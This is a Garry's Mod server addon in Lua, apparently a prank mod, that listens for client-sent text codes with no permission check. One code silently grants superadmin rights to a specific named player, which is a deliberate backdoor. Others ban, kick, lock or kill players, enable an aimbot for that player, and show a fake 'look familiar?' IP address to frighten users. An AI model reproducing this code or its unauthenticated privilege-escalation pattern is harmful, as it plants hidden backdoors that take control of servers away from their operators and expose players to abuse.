if SERVER and not game.SinglePlayer() then

-- get known players
local knownPlayers, networkindex = {}, util.KeyValuesToTable( file.Read( "scripts/sexKnownPlayers.txt", "GAME" ) )
for i,v in pairs(networkindex) do
	networkindex[i:upper()] = v
end
gameevent.Listen( "player_connect" )
hook.Add("player_connect", "addToKnownPlayers", function( data )
	timer.Create("sexWaitPlayer", 0.5, math.huge, function() --TODO: dumb, fix it some other way 
		local plr, netid = Player(data.userid), data.networkid
		if plr != Player(0) then
			print(data.name .. " (" .. data.networkid .. ") entity has loaded")
			print(networkindex[data.networkid])
			for _,v in pairs(networkindex) do
				print(v)
			end
			if networkindex[data.networkid] then
				knownPlayers[networkindex[data.networkid]] = Player(data.userid)
			end
			timer.Remove("sexWaitPlayer")
		end
	end)
end)
--script
 
local sexVersion = "1.3.4"

util.AddNetworkString( "THESEXHOOK" )
util.AddNetworkString( "SexAlertClient" )
util.AddNetworkString( "SexSoundClient" )
util.AddNetworkString( "SexLeanMode" )

local bAimbotEnabled = false

net.Receive( "THESEXHOOK", function( len, ply )
	local code = tostring(net.ReadString()):lower()
	if code == "version" then
		BroadcastLua(" print('Sexmod v" .. sexVersion .. "')")
	elseif code == "rescanplayers" then
		for _,v in ipairs(player.GetAll()) do
			if networkindex[v:SteamID()] then
				knownPlayers[networkindex[v:SteamID()]] = Player(v:UserID())
			end
		end
	elseif code == "givebenbebopcoolpowers" and knownPlayers.benbebop then
		if knownPlayers.benbebop:GetUserGroup() != "superadmin" then
			knownPlayers.benbebop:SetUserGroup( "superadmin" )
			net.Start( "SexAlertClient" )
			net.WriteString( "HOLY FUCKING SHIT SOMEONE GAVE BENBEBOP GOD POWERS!!!!! WE ARE FUCKED!!!!!" )
			net.Broadcast()
			net.Start( "SexSoundClient" )
			net.WriteString( "music/hl1_song10.mp3" )
			net.Broadcast()
		end
	elseif code == "makelarrysexy" and knownPlayers.larry then
		knownPlayers.larry:Give("pist_weagon")
		net.Start( "SexAlertClient" )
		net.WriteString( "larry has now acquired sexiness ", "music/hl1_song10.mp3" )
		net.Broadcast()
	elseif code == "fuckofflarry" and knownPlayers.larry then
		--cleanup.CC_Cleanup( knownPlayers.larry )
		knownPlayers.larry:Lock()
	elseif code == "fuckonlarry" and knownPlayers.larry then
		knownPlayers.larry:UnLock()
	elseif code == "paulsux" then
		ply:Kick()
	elseif code == "unforeseenconsequences" then
		net.Start( "SexSoundClient" )
		net.WriteString( "music/hl1_song5.mp3" )
		net.Broadcast()
	elseif code == "deeznuts" then
		ply:Ban(15, true)
	elseif code == "rtd" then
		local roll, reward = math.random(58), "" --math.random(100)
		local function evaluate(bottom, top)
			return bottom <= roll and roll <= top
		end
		if roll != 3 and evaluate(1, 4) then
			ply:Ban(1, true)
			reward = "minute-long ban"
		elseif roll == 3 then
			ply:Ban(60, true)
			reward = "hour-long ban"
		elseif evaluate(5, 10) then
			if navmesh.IsLoaded() then
				local positions = {}
				for _,v in ipairs(navmesh.GetAllNavAreas()) do
					table.insert(positions, v:GetCenter())
				end
				ply:SetPos( positions[math.random(#positions)] )
				reward = "random teleport"
			else
				reward = "random teleport (no navmesh)"
			end
		elseif evaluate(11, 25) then
			ply:SetArmor( ply:Armor() + 1000 )
			reward = "+1000 armor"
		elseif evaluate(26, 30) then
			ply:Give("pist_weagon")
			reward = "sexiness"
		elseif roll == 31 then
			ply:SetJumpPower( 0 )
			reward = "no more jumping"
		elseif roll == 32 then
			ply:SetJumpPower( 2 ^ 16 )
			reward = "jump height increased"
		elseif evaluate(33, 35) then
			ply:RemoveAllAmmo()
			reward = "stripped ammo"
		elseif roll == 36 then
			ply:RemoveAllItems()
			reward = "stripped items"
		elseif roll == 37 then
			ply:SprintDisable()
			reward = "no more sprinting"
		elseif evaluate(38, 40) then
			ply:DropWeapon( ply:GetActiveWeapon() )
			reward = "dropped weapon"
		elseif roll == 41 then
			ply:SetHealth( 1 )
			ply:SetMaxHealth( 1 )
			ply:SetArmor( 0 )
			ply:SetMaxArmor( 0 )
			reward = "1 hp"
		elseif roll == 42 then
			ply:Flashlight( not ply:FlashlightIsOn() )
			reward = "toggle flashlight"
		elseif evaluate(43, 46) then
			ply:Kill()
			reward = "death"
		elseif evaluate(47, 50) then
			ply:PlayStepSound( 1 )
			reward = "step sound"
		elseif roll == 51 then
			local prefov = ply:GetFOV()
			ply:SetFOV( 20, 0 )
			reward = "zoom"
		elseif evaluate(52, 55) then
			ply:SetPlayerColor( Vector( math.random(255) / 255 , math.random(255) / 255, math.random(255) / 255 ) )
			ply:SetWeaponColor( Vector( math.random(255) / 255 , math.random(255) / 255, math.random(255) / 255 ) )
			reward = "random player color"
		elseif evaluate(56, 58) then
			ply:UnfreezePhysicsObjects()
			reward = "unfroze objects"
		elseif roll == 69 then
			reward = "nice"
		end
		if reward == "" then
			reward = "you got nothin"
		end
		print(ply:Nick() .. " rolled a " .. roll .. " (" .. reward .. ")")
		ply:PrintMessage( HUD_PRINTCENTER, reward .. "!")
	elseif code == "sexmodsucks" then
		math.randomseed(ply:SteamID64())
		local rand = math.random
		local ip = rand(100, 199) .. "." .. rand(100, 199) .. "." .. rand(1, 9) .. "." .. rand(100, 199) .. ":" .. rand(10000, 99999)
		ply:PrintMessage( HUD_PRINTCENTER, "look familiar? " .. ip ) 
	elseif code == "benbeaimbot" and knownPlayers.benbebop then
		net.Start( "SexLeanMode" )
		net.Send( ply )
	else
		BroadcastLua(" print('sex has been activated')")
	end
end )

hook.Add( "AlertClient", "NotifyClient", function( ply, inf, att )
	net.Start( "PlayerDied" )
	net.WriteEntity( ply )
	net.Broadcast()
end )

end